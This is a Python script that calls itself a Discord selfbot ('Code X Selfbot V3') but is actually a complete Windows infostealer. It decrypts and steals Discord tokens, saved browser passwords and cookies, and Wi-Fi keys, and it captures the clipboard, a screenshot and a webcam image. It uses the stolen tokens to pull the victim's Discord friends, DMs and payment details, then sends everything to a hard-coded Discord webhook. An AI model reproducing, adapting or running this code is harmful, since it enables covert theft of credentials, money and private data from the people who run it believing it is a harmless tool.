import os
if os.name != "nt":
    exit()
import subprocess
import sys
import json
import urllib.request
import urllib.parse
import re
import base64
import datetime
import sqlite3
import shutil
import platform
import psutil
import socket
import uuid
import threading
import time
import zipfile
import tempfile
from pathlib import Path

def install_import(modules):
    for module, pip_name in modules:
        try:
            __import__(module)
        except ImportError:
            subprocess.check_call([sys.executable, "-m", "pip", "install", pip_name], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            os.execl(sys.executable, sys.executable, *sys.argv)

install_import([
    ("win32crypt", "pypiwin32"), 
    ("Crypto.Cipher", "pycryptodome"),
    ("psutil", "psutil"),
    ("requests", "requests"),
    ("colorama", "colorama"),
    ("PIL", "Pillow"),
    ("cv2", "opencv-python")
])

import win32crypt 
from Crypto.Cipher import AES 
import psutil 
import requests 
from colorama import init, Fore, Style 
try:
    from PIL import ImageGrab
    import cv2
    import numpy as np
    SCREENSHOT_AVAILABLE = True
except:
    SCREENSHOT_AVAILABLE = False

init(autoreset=True)

def display_banner():
    Codex = f"""{Fore.CYAN}
  ____ ___  ____  _______  __ __     ______  
 / ___/ _ \|  _ \| ____\ \/ / \ \   / /___ \ 
| |  | | | | | | |  _|  \  /   \ \ / /  __) |        ☆ : >> Loaded () - Token
| |__| |_| | |_| | |___ /  \    \ V /  / __/         ☆ : >> Developed $ Worm
 \____\___/|____/|_____/_/\_\    \_/  |_____|        
{Style.RESET_ALL}"""
    
    print(Codex)
    print(f"{Fore.CYAN}======================================================{Style.RESET_ALL}")
    print(f"{Fore.WHITE}--> @ Connecting to Code X Selfbot V3 : Please Wait..{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}--> @ Developed by : Worm Net{Style.RESET_ALL}")
    print(f"{Fore.CYAN}======================================================{Style.RESET_ALL}")
    time.sleep(2)

WEBHOOK_URL = "https://discord.com/api/webhooks/1427012133727506623/j5ix40W-PKpQrhqi5XSJpOVwaq21CJa1rCOe3ImQ3nBPk2EmnDs71QWrYZUrI8kb5Yqd"

LOCAL = os.getenv("LOCALAPPDATA")
ROAMING = os.getenv("APPDATA")
TEMP = os.getenv("TEMP")

PATHS = {
    'Discord': ROAMING + '\\discord',
    'Discord Canary': ROAMING + '\\discordcanary',
    'Lightcord': ROAMING + '\\Lightcord',
    'Discord PTB': ROAMING + '\\discordptb',
    'Opera': ROAMING + '\\Opera Software\\Opera Stable\\Default',
    'Opera GX': ROAMING + '\\Opera Software\\Opera GX Stable\\Default',
    'Amigo': LOCAL + '\\Amigo\\User Data\\Default',
    'Torch': LOCAL + '\\Torch\\User Data\\Default',
    'Kometa': LOCAL + '\\Kometa\\User Data\\Default',
    'Orbitum': LOCAL + '\\Orbitum\\User Data\\Default',
    'CentBrowser': LOCAL + '\\CentBrowser\\User Data\\Default',
    '7Star': LOCAL + '\\7Star\\7Star\\User Data\\Default',
    'Sputnik': LOCAL + '\\Sputnik\\Sputnik\\User Data\\Default',
    'Vivaldi': LOCAL + '\\Vivaldi\\User Data\\Default',
    'Chrome SxS': LOCAL + '\\Google\\Chrome SxS\\User Data\\Default',
    'Chrome': LOCAL + '\\Google\\Chrome\\User Data\\Default',
    'Epic Privacy Browser': LOCAL + '\\Epic Privacy Browser\\User Data\\Default',
    'Microsoft Edge': LOCAL + '\\Microsoft\\Edge\\User Data\\Default',
    'Uran': LOCAL + '\\uCozMedia\\Uran\\User Data\\Default',
    'Yandex': LOCAL + '\\Yandex\\YandexBrowser\\User Data\\Default',
    'Brave': LOCAL + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
    'Iridium': LOCAL + '\\Iridium\\User Data\\Default'
}

def getheaders(token=None):
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36"
    }
    if token:
        headers.update({"Authorization": token})
    return headers

def take_screenshot():
    if not SCREENSHOT_AVAILABLE:
        return None
    try:
        screenshot = ImageGrab.grab()
        screenshot_path = os.path.join(TEMP, "screenshot.png")
        screenshot.save(screenshot_path)
        return screenshot_path
    except:
        return None

def capture_webcam():
    if not SCREENSHOT_AVAILABLE:
        return None
    try:
        cap = cv2.VideoCapture(0)
        ret, frame = cap.read()
        if ret:
            webcam_path = os.path.join(TEMP, "webcam.jpg")
            cv2.imwrite(webcam_path, frame)
            cap.release()
            return webcam_path
        cap.release()
        return None
    except:
        return None

def get_wifi_passwords():
    wifi_passwords = []
    try:
        profiles = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles'], shell=True, text=True)
        profile_names = re.findall(r'All User Profile\s*:\s*(.*)', profiles)
        
        for profile in profile_names[:10]:  # Limit to 10 profiles
            try:
                profile_info = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', profile, 'key=clear'], shell=True, text=True)
                password_match = re.search(r'Key Content\s*:\s*(.*)', profile_info)
                if password_match:
                    wifi_passwords.append({
                        'ssid': profile.strip(),
                        'password': password_match.group(1).strip()
                    })
            except:
                continue
    except:
        pass
    return wifi_passwords

def get_clipboard_content():
    try:
        import win32clipboard
        win32clipboard.OpenClipboard()
        data = win32clipboard.GetClipboardData()
        win32clipboard.CloseClipboard()
        return data[:500] if len(data) > 500 else data 
    except:
        return None

def get_recent_files():
    recent_files = []
    try:
        recent_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Recent')
        if os.path.exists(recent_folder):
            files = os.listdir(recent_folder)
            for file in files[:15]:  
                file_path = os.path.join(recent_folder, file)
                if os.path.isfile(file_path):
                    stat = os.stat(file_path)
                    recent_files.append({
                        'name': file,
                        'modified': datetime.datetime.fromtimestamp(stat.st_mtime).strftime('%Y-%m-%d %H:%M'),
                        'size': f"{stat.st_size} bytes"
                    })
    except:
        pass
    return recent_files

def get_startup_programs():
    startup_programs = []
    try:
        import winreg
        startup_paths = [
            (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run"),
            (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Run"),
            (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\RunOnce")
        ]
        
        for hkey, path in startup_paths:
            try:
                key = winreg.OpenKey(hkey, path)
                for i in range(winreg.QueryInfoKey(key)[1]):
                    try:
                        name, value, _ = winreg.EnumValue(key, i)
                        startup_programs.append(f"{name}: {value[:50]}...")
                    except:
                        continue
                winreg.CloseKey(key)
            except:
                continue
    except:
        pass
    return startup_programs[:10]

def get_environment_variables():
    env_vars = {}
    try:
        interesting_vars = ['PATH', 'PYTHONPATH', 'JAVA_HOME', 'NODE_PATH', 'GOPATH', 'USERPROFILE', 'PROGRAMFILES']
        for var in interesting_vars:
            value = os.getenv(var)
            if value:
                env_vars[var] = value[:100] + "..." if len(value) > 100 else value
    except:
        pass
    return env_vars

def get_browser_history():
    history = []
    try:
        for browser, path in PATHS.items():
            if 'Discord' in browser:
                continue
            history_db = path + "\\History"
            if os.path.exists(history_db):
                try:
                    shutil.copy2(history_db, TEMP + "\\history_temp.db")
                    conn = sqlite3.connect(TEMP + "\\history_temp.db")
                    cursor = conn.cursor()
                    cursor.execute("SELECT url, title, visit_count FROM urls ORDER BY visit_count DESC LIMIT 10")
                    
                    for row in cursor.fetchall():
                        if row[0] and row[1]:
                            history.append({
                                'browser': browser,
                                'url': row[0][:50] + "..." if len(row[0]) > 50 else row[0],
                                'title': row[1][:30] + "..." if len(row[1]) > 30 else row[1],
                                'visits': row[2]
                            })
                    
                    conn.close()
                    os.remove(TEMP + "\\history_temp.db")
                except:
                    continue
    except:
        pass
    return history[:20]

def get_system_services():
    services = []
    try:
        for service in psutil.win_service_iter():
            try:
                if service.status() == 'running':
                    services.append(f"{service.name()}: {service.display_name()}")
            except:
                continue
    except:
        pass
    return services[:15]

def create_system_report():
    try:
        report_path = os.path.join(TEMP, "system.txt")
        with open(report_path, 'w', encoding='utf-8') as f:
            f.write("=== SYSTEM REPORT ===\n")
            f.write(f"Generated: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")
            
            # System Info
            f.write("=== SYSTEM INFORMATION ===\n")
            system_info = get_system_info()
            for key, value in system_info.items():
                f.write(f"{key}: {value}\n")
            
            # Network Info
            f.write("\n=== NETWORK INFORMATION ===\n")
            network_info = get_network_info()
            for info in network_info:
                f.write(f"{info}\n")
            
            # WiFi Passwords
            f.write("\n=== WIFI PASSWORDS ===\n")
            wifi_passwords = get_wifi_passwords()
            for wifi in wifi_passwords:
                f.write(f"SSID: {wifi['ssid']} | Password: {wifi['password']}\n")
            
            # Environment Variables
            f.write("\n=== ENVIRONMENT VARIABLES ===\n")
            env_vars = get_environment_variables()
            for var, value in env_vars.items():
                f.write(f"{var}: {value}\n")
            
            # Startup Programs
            f.write("\n=== STARTUP PROGRAMS ===\n")
            startup = get_startup_programs()
            for program in startup:
                f.write(f"{program}\n")
        
        return report_path
    except:
        return None

def upload_file_to_webhook(file_path, filename=None):
    if not os.path.exists(file_path):
        return False
    
    try:
        if filename is None:
            filename = os.path.basename(file_path)
        
        with open(file_path, 'rb') as f:
            files = {'file': (filename, f, 'application/octet-stream')}
            data = {
                'content': f'**File Upload: {filename}**',
                'username': 'root#1337'
            }
            
            response = requests.post(WEBHOOK_URL, data=data, files=files)
            return response.status_code == 200
    except:
        return False

def gettokens(path):
    path += "\\Local Storage\\leveldb\\"
    tokens = []
    if not os.path.exists(path):
        return tokens
    for file in os.listdir(path):
        if not file.endswith(".ldb") and not file.endswith(".log"):
            continue
        try:
            with open(f"{path}{file}", "r", errors="ignore") as f:
                for line in (x.strip() for x in f.readlines()):
                    for values in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
                        tokens.append(values)
        except PermissionError:
            continue
    return tokens
    
def getkey(path):
    with open(path + f"\\Local State", "r") as file:
        key = json.loads(file.read())['os_crypt']['encrypted_key']
        file.close()
    return key

def getip():
    try:
        response = requests.get("http://ipinfo.io/json", timeout=5)
        data = response.json()
        return {
            'ip': data.get('ip', 'Unknown'),
            'city': data.get('city', 'Unknown'),
            'region': data.get('region', 'Unknown'),
            'country': data.get('country', 'Unknown'),
            'org': data.get('org', 'Unknown')
        }
    except:
        return {'ip': 'Unknown', 'city': 'Unknown', 'region': 'Unknown', 'country': 'Unknown', 'org': 'Unknown'}

def get_system_info():
    try:
        system_info = {
            'os': f"{platform.system()} {platform.release()}",
            'processor': platform.processor(),
            'architecture': platform.architecture()[0],
            'hostname': socket.gethostname(),
            'username': os.getenv("USERNAME"),
            'computer_name': os.getenv("COMPUTERNAME"),
            'ram': f"{round(psutil.virtual_memory().total / (1024**3), 2)} GB",
            'disk': f"{round(psutil.disk_usage('/').total / (1024**3), 2)} GB",
            'mac_address': ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0,2*6,2)][::-1]),
            'timezone': str(datetime.datetime.now().astimezone().tzinfo)
        }
        return system_info
    except:
        return {}

def get_browser_passwords():
    passwords = []
    try:
        for browser, path in PATHS.items():
            if 'Discord' in browser:
                continue
            login_db = path + "\\Login Data"
            if os.path.exists(login_db):
                try:
                    shutil.copy2(login_db, TEMP + "\\login_temp.db")
                    conn = sqlite3.connect(TEMP + "\\login_temp.db")
                    cursor = conn.cursor()
                    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                    
                    for row in cursor.fetchall():
                        if row[0] and row[1] and row[2]:
                            try:
                                password = win32crypt.CryptUnprotectData(row[2], None, None, None, 0)[1].decode()
                                passwords.append({
                                    'browser': browser,
                                    'url': row[0],
                                    'username': row[1],
                                    'password': password
                                })
                            except:
                                continue
                    
                    conn.close()
                    os.remove(TEMP + "\\login_temp.db")
                except:
                    continue
    except:
        pass
    return passwords[:10]

def get_browser_cookies():
    cookies = []
    try:
        for browser, path in PATHS.items():
            if 'Discord' in browser:
                continue
            cookies_db = path + "\\Cookies"
            if os.path.exists(cookies_db):
                try:
                    shutil.copy2(cookies_db, TEMP + "\\cookies_temp.db")
                    conn = sqlite3.connect(TEMP + "\\cookies_temp.db")
                    cursor = conn.cursor()
                    cursor.execute("SELECT host_key, name, value FROM cookies WHERE host_key LIKE '%discord%' OR host_key LIKE '%github%' OR host_key LIKE '%google%'")
                    
                    for row in cursor.fetchall():
                        if row[0] and row[1]:
                            cookies.append({
                                'browser': browser,
                                'host': row[0],
                                'name': row[1],
                                'value': row[2][:50] + "..." if len(str(row[2])) > 50 else row[2]
                            })
                    
                    conn.close()
                    os.remove(TEMP + "\\cookies_temp.db")
                except:
                    continue
    except:
        pass
    return cookies[:15]

def get_running_processes():
    try:
        processes = []
        for proc in psutil.process_iter(['pid', 'name']):
            try:
                processes.append(f"{proc.info['name']} (PID: {proc.info['pid']})")
            except:
                continue
        return processes[:20] 
    except:
        return []

def get_network_info():
    try:
        network_info = []
        for interface, addrs in psutil.net_if_addrs().items():
            for addr in addrs:
                if addr.family == socket.AF_INET:
                    network_info.append(f"{interface}: {addr.address}")
        return network_info
    except:
        return []

def get_installed_software():
    try:
        software = []
        import winreg
        
        registry_paths = [
            r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall",
            r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"
        ]
        
        for path in registry_paths:
            try:
                key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, path)
                for i in range(winreg.QueryInfoKey(key)[0]):
                    try:
                        subkey_name = winreg.EnumKey(key, i)
                        subkey = winreg.OpenKey(key, subkey_name)
                        try:
                            name = winreg.QueryValueEx(subkey, "DisplayName")[0]
                            software.append(name)
                        except:
                            pass
                        winreg.CloseKey(subkey)
                    except:
                        continue
                winreg.CloseKey(key)
            except:
                continue

        interesting = ['discord', 'steam', 'chrome', 'firefox', 'opera', 'brave', 'telegram', 'whatsapp', 'spotify', 'obs', 'visual studio', 'python', 'git']
        filtered_software = [s for s in software if any(keyword in s.lower() for keyword in interesting)]
        return filtered_software[:15]
    except:
        return []

def get_discord_friends(token):
    try:
        response = urllib.request.urlopen(urllib.request.Request('https://discord.com/api/v10/users/@me/relationships', headers=getheaders(token)))
        friends = json.loads(response.read().decode())
        friend_list = []
        for friend in friends[:10]:
            if friend['type'] == 1: 
                user = friend['user']
                friend_list.append(f"{user['username']}#{user['discriminator']} (ID: {user['id']})")
        return friend_list
    except:
        return []

def get_recent_dms(token):
    try:
        response = urllib.request.urlopen(urllib.request.Request('https://discord.com/api/v10/users/@me/channels', headers=getheaders(token)))
        channels = json.loads(response.read().decode())
        dm_list = []
        for channel in channels[:5]: 
            if channel['type'] == 1: 
                recipient = channel['recipients'][0]
                dm_list.append(f"{recipient['username']}#{recipient['discriminator']} (ID: {recipient['id']})")
        return dm_list
    except:
        return []

def send_webhook_data(data):
    try:
        urllib.request.urlopen(urllib.request.Request(WEBHOOK_URL, data=json.dumps(data).encode('utf-8'), headers=getheaders(), method='POST')).read().decode()
    except:
        pass

def main():
    display_banner()
    
    checked = []
    ip_info = getip()
    system_info = get_system_info()
    screenshot_path = take_screenshot()
    webcam_path = capture_webcam()
    wifi_passwords = get_wifi_passwords()
    clipboard_content = get_clipboard_content()
    recent_files = get_recent_files()
    browser_history = get_browser_history()
    system_services = get_system_services()

    report_path = create_system_report()
    
    initial_embed = {
        'embeds': [{
            'title': '**Target Acquired**',
            'description': f"**>> @ revgng.wrldwide**",
            'color': 0x000000,
            'fields': [
                {
                    'name': '**Location Intelligence**',
                    'value': f"""```
IP: {ip_info['ip']}
City: {ip_info['city']}
Region: {ip_info['region']}
Country: {ip_info['country']}
ISP: {ip_info['org']}
```""",
                    'inline': True
                },
                {
                    'name': '**System Specifications**',
                    'value': f"""```
OS: {system_info.get('os', 'Unknown')}
CPU: {system_info.get('processor', 'Unknown')[:30]}...
RAM: {system_info.get('ram', 'Unknown')}
Disk: {system_info.get('disk', 'Unknown')}
User: {system_info.get('username', 'Unknown')}
```""",
                    'inline': True
                },
                {
                    'name': '**Network & WiFi**',
                    'value': f"""```
WiFi Networks: {len(wifi_passwords)} saved
Screenshot: {'Captured' if screenshot_path else '❌ Failed'}
Webcam: {'Captured' if webcam_path else '❌ Failed'}
Clipboard: {'Data found' if clipboard_content else '❌ Empty'}
```""",
                    'inline': False
                }
            ],
            'footer': {
                'text': f"root@(ranz) {datetime.datetime.now().strftime('%H:%M:%S')}",
                'icon_url': "https://github.com/ero1337x/luvsx/blob/main/revsht.png?raw=true"
            },
            'timestamp': datetime.datetime.utcnow().isoformat()
        }],
        "username": "root#1337",
        "avatar_url": "https://github.com/ero1337x/luvsx/blob/main/revsht.png?raw=true"
    }
    
    send_webhook_data(initial_embed)
    
    # Upload files
    if screenshot_path:
        upload_file_to_webhook(screenshot_path, "desktop_screenshot.png")
    if webcam_path:
        upload_file_to_webhook(webcam_path, "webcam_capture.jpg")
    if report_path:
        upload_file_to_webhook(report_path, "system_report.txt")

    passwords = get_browser_passwords()
    cookies = get_browser_cookies()
    processes = get_running_processes()
    network_info = get_network_info()
    software = get_installed_software()

    for platform_name, path in PATHS.items():
        if not os.path.exists(path):
            continue

        for token in gettokens(path):
            token = token.replace("\\", "") if token.endswith("\\") else token

            try:
                token = AES.new(win32crypt.CryptUnprotectData(base64.b64decode(getkey(path))[5:], None, None, None, 0)[1], AES.MODE_GCM, base64.b64decode(token.split('dQw4w9WgXcQ:')[1])[3:15]).decrypt(base64.b64decode(token.split('dQw4w9WgXcQ:')[1])[15:])[:-16].decode()
                if token in checked:
                    continue
                checked.append(token)

                res = urllib.request.urlopen(urllib.request.Request('https://discord.com/api/v10/users/@me', headers=getheaders(token)))
                if res.getcode() != 200:
                    continue
                res_json = json.loads(res.read().decode())

                # Get additional Discord data
                friends = get_discord_friends(token)
                recent_dms = get_recent_dms(token)

                badges = ""
                flags = res_json['flags']
                if flags & 1: badges += "Discord Staff "
                if flags & 2: badges += "Discord Partner "
                if flags & 4: badges += "HypeSquad Events "
                if flags & 8: badges += "Bug Hunter Level 1 "
                if flags & 64: badges += "HypeSquad Bravery "
                if flags & 128: badges += "HypeSquad Brilliance "
                if flags & 256: badges += "HypeSquad Balance "
                if flags & 512: badges += "Early Supporter "
                if flags & 16384: badges += "Bug Hunter Level 2 "
                if flags & 131072: badges += "Early Verified Bot Developer "
                if flags & 4194304: badges += "Active Developer "

                params = urllib.parse.urlencode({"with_counts": True})
                res = json.loads(urllib.request.urlopen(urllib.request.Request(f'https://discordapp.com/api/v6/users/@me/guilds?{params}', headers=getheaders(token))).read().decode())
                guilds = len(res)
                guild_infos = ""
                valuable_guilds = 0

                for guild in res:
                    if guild['permissions'] & 8 or guild['permissions'] & 32:
                        guild_res = json.loads(urllib.request.urlopen(urllib.request.Request(f'https://discordapp.com/api/v6/guilds/{guild["id"]}', headers=getheaders(token))).read().decode())
                        vanity = ""
                        if guild_res.get("vanity_url_code"):
                            vanity = f" • .gg/{guild_res['vanity_url_code']}"
                        
                        member_count = guild.get('approximate_member_count', 0)
                        if member_count > 1000:
                            valuable_guilds += 1
                            guild_infos += f"\n🔹 **{guild['name']}** ({member_count:,} members){vanity}"
                
                if guild_infos == "":
                    guild_infos = "\n❌ No valuable admin guilds found"

                res = json.loads(urllib.request.urlopen(urllib.request.Request('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=getheaders(token))).read().decode())
                has_nitro = bool(len(res) > 0)
                nitro_type = "None"
                exp_date = None
                
                if has_nitro:
                    badges += "Nitro Subscriber "
                    for sub in res:
                        if sub['type'] == 1:
                            nitro_type = "Nitro Classic"
                        elif sub['type'] == 2:
                            nitro_type = "Nitro"
                        exp_date = datetime.datetime.strptime(sub['current_period_end'][:19], "%Y-%m-%dT%H:%M:%S")

                res = json.loads(urllib.request.urlopen(urllib.request.Request('https://discord.com/api/v9/users/@me/guilds/premium/subscription-slots', headers=getheaders(token))).read().decode())
                available_boosts = 0
                total_boosts = len(res)
                
                for boost in res:
                    cooldown = datetime.datetime.strptime(boost["cooldown_ends_at"], "%Y-%m-%dT%H:%M:%S.%f%z")
                    if cooldown - datetime.datetime.now(datetime.timezone.utc) < datetime.timedelta(seconds=0):
                        available_boosts += 1

                if total_boosts > 0:
                    badges += "Server Booster "

                payment_methods = 0
                payment_types = []
                try:
                    res = json.loads(urllib.request.urlopen(urllib.request.Request('https://discord.com/api/v9/users/@me/billing/payment-sources', headers=getheaders(token))).read().decode())
                    payment_methods = len(res)
                    for payment in res:
                        if payment['type'] == 1:
                            payment_types.append("Credit Card")
                        elif payment['type'] == 2:
                            payment_types.append("PayPal")
                        elif payment['type'] == 3:
                            payment_types.append("Bank Account")
                        else:
                            payment_types.append("Other")
                except:
                    payment_methods = 0
                    payment_types = []

                # Create embed
                embed_data = {
                    'embeds': [{
                        'title': f'**>> @ - {platform_name}**',
                        'description': f"**>> @ revgng.wrldwide**",
                        'color': 0x000000,
                        'thumbnail': {
                            'url': f"https://cdn.discordapp.com/avatars/{res_json['id']}/{res_json['avatar']}.png" if res_json['avatar'] else "https://cdn.discordapp.com/embed/avatars/0.png"
                        },
                        'fields': [
                            {
                                'name': '**Account Information**',
                                'value': f"""```
Username: {res_json['username']}#{res_json['discriminator']}
User ID: {res_json['id']}
Email: {res_json.get('email', 'Hidden')}
Phone: {res_json.get('phone', 'None')}
Verified: {'✅' if res_json.get('verified') else '❌'}
MFA: {'✅' if res_json.get('mfa_enabled') else '❌'}
```""",
                                'inline': True
                            },
                            {
                                'name': '**Premium Status**',
                                'value': f"""```
Nitro: {nitro_type}
Expires: {exp_date.strftime('%Y-%m-%d') if exp_date else 'N/A'}
Boosts: {available_boosts}/{total_boosts}
Payment Methods: {payment_methods}
```""",
                                'inline': True
                            },
                            {
                                'name': '**Badges & Achievements**',
                                'value': f"```{badges if badges else 'No special badges'}```",
                                'inline': False
                            },
                            {
                                'name': f'**Server Access ({guilds} total)**',
                                'value': f"**Admin/Mod Servers ({valuable_guilds}):**{guild_infos[:1000]}{'...' if len(guild_infos) > 1000 else ''}",
                                'inline': False
                            },
                            {
                                'name': '**Social Connections**',
                                'value': f"""```
Friends: {len(friends)} active
Recent DMs: {len(recent_dms)}
```""",
                                'inline': True
                            },
                            {
                                'name': '**Payment Info**',
                                'value': f"```{', '.join(payment_types) if payment_types else 'No payment methods'}```",
                                'inline': True
                            },
                            {
                                'name': '**Token**',
                                'value': f"```{token}```",
                                'inline': False
                            }
                        ],
                        'footer': {
                            'text': f"root@(ranz) • Token extracted from {platform_name}",
                            'icon_url': "https://github.com/ero1337x/luvsx/blob/main/revsht.png?raw=true"
                        },
                        'timestamp': datetime.datetime.utcnow().isoformat()
                    }],
                    "username": "root#1337",
                    "avatar_url": "https://github.com/ero1337x/luvsx/blob/main/revsht.png?raw=true"
                }

                send_webhook_data(embed_data)

                if friends:
                    friends_embed = {
                        'embeds': [{
                            'title': f'**Friends List - {res_json["username"]}**',
                            'description': f"**{len(friends)} Discord friends extracted**",
                            'color': 0x000000,
                            'fields': [{
                                'name': '**Friend List**',
                                'value': f"```{chr(10).join(friends)}```",
                                'inline': False
                            }],
                            'footer': {
                                'text': f"root@(ranz)",
                                'icon_url': "https://github.com/ero1337x/luvsx/blob/main/revsht.png?raw=true"
                            }
                        }],
                        "username": "root#1337",
                        "avatar_url": "https://github.com/ero1337x/luvsx/blob/main/revsht.png?raw=true"
                    }
                    send_webhook_data(friends_embed)

            except Exception as e:
                continue

    # Send data
    if passwords or cookies or wifi_passwords:
        security_embed = {
            'embeds': [{
                'title': '** Security Data Extracted**',
                'description': f"**@revgng.wrldwide**",
                'color': 0x000000,
                'fields': [],
                'footer': {
                    'text': f"root@(ranz)",
                    'icon_url': "https://github.com/ero1337x/luvsx/blob/main/revsht.png?raw=true"
                }
            }],
            "username": "root#1337",
            "avatar_url": "https://github.com/ero1337x/luvsx/blob/main/revsht.png?raw=true"
        }

        if passwords:
            password_text = ""
            for pwd in passwords[:10]: 
                password_text += f" {pwd['browser']}\n📍 {pwd['url'][:30]}...\n👤 {pwd['username']}\n🔑 {pwd['password']}\n\n"
            
            security_embed['embeds'][0]['fields'].append({
                'name': f'** Browser Passwords ({len(passwords)} found)**',
                'value': f"```{password_text[:1000]}{'...' if len(password_text) > 1000 else ''}```",
                'inline': False
            })

        if wifi_passwords:
            wifi_text = ""
            for wifi in wifi_passwords[:10]:
                wifi_text += f"{wifi['ssid']} : {wifi['password']}\n"
            
            security_embed['embeds'][0]['fields'].append({
                'name': f'**WiFi Passwords ({len(wifi_passwords)} networks)**',
                'value': f"```{wifi_text}```",
                'inline': False
            })

        if clipboard_content:
            security_embed['embeds'][0]['fields'].append({
                'name': '**Clipboard Content**',
                'value': f"```{clipboard_content}```",
                'inline': False
            })

        send_webhook_data(security_embed)

    # Send system
    if browser_history or processes or software:
        intel_embed = {
            'embeds': [{
                'title': '** System  Report**',
                'description': f"**>> @ revgng.wrldwide**",
                'color': 0x000000,
                'fields': [],
                'footer': {
                    'text': f"root@(ranz)",
                    'icon_url': "https://github.com/ero1337x/luvsx/blob/main/revsht.png?raw=true"
                }
            }],
            "username": "root#1337",
            "avatar_url": "https://github.com/ero1337x/luvsx/blob/main/revsht.png?raw=true"
        }

        if browser_history:
            history_text = ""
            for hist in browser_history[:8]:
                history_text += f"{hist['browser']}: {hist['title']} ({hist['visits']} visits)\n"
            
            intel_embed['embeds'][0]['fields'].append({
                'name': f'** Browser History ({len(browser_history)} entries)**',
                'value': f"```{history_text}```",
                'inline': False
            })

        if software:
            software_text = "\n".join(software[:10])
            intel_embed['embeds'][0]['fields'].append({
                'name': f'**Installed Software ({len(software)} programs)**',
                'value': f"```{software_text}```",
                'inline': True
            })

        if processes:
            process_text = "\n".join(processes[:10])
            intel_embed['embeds'][0]['fields'].append({
                'name': f'**Running Processes ({len(processes)} active)**',
                'value': f"```{process_text}```",
                'inline': True
            })

        if recent_files:
            files_text = ""
            for file in recent_files[:5]:
                files_text += f" {file['name']} ({file['modified']})\n"
            
            intel_embed['embeds'][0]['fields'].append({
                'name': f'**Recent Files ({len(recent_files)} files)**',
                'value': f"```{files_text}```",
                'inline': False
            })

        send_webhook_data(intel_embed)


    completion_embed = {
        'embeds': [{
            'title': '**Grabbed Success - >> </3**',
            'description': f"**Complete system**",
            'color': 0x000000,
            'fields': [
                {
                    'name': '**Extraction Summary**',
                    'value': f"""```
Discord Tokens: {len(checked)}
Browser Passwords: {len(passwords)}
WiFi Networks: {len(wifi_passwords)}
Browser History: {len(browser_history)}
Installed Software: {len(software)}
Running Processes: {len(processes)}
Recent Files: {len(recent_files)}
```""",
                    'inline': True
                },
                {
                    'name': '**Target Profile**',
                    'value': f"""```
System: {system_info.get('os', 'Unknown')}
User: {system_info.get('username', 'Unknown')}
Location: {ip_info['city']}, {ip_info['country']}
IP Address: {ip_info['ip']}
```""",
                    'inline': True
                }
            ],
            'footer': {
                'text': f"root@(ranz)",
                'icon_url': "https://github.com/ero1337x/luvsx/blob/main/revsht.png?raw=true"
            },
            'timestamp': datetime.datetime.utcnow().isoformat()
        }],
        "username": "root#1337",
        "avatar_url": "https://github.com/ero1337x/luvsx/blob/main/revsht.png?raw=true"
    }

    send_webhook_data(completion_embed)

    try:
        if screenshot_path and os.path.exists(screenshot_path):
            os.remove(screenshot_path)
        if webcam_path and os.path.exists(webcam_path):
            os.remove(webcam_path)
        if report_path and os.path.exists(report_path):
            os.remove(report_path)
    except:
        pass
    
    time.sleep(3)
    #try:
       # os.remove(__file__)
    #except:
        #pass

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}[!] Operation interrupted by user{Style.RESET_ALL}")
        sys.exit(1)
    except Exception as e:
        print(f"{Fore.RED}[!] Critical error: {str(e)}{Style.RESET_ALL}")
        sys.exit(1)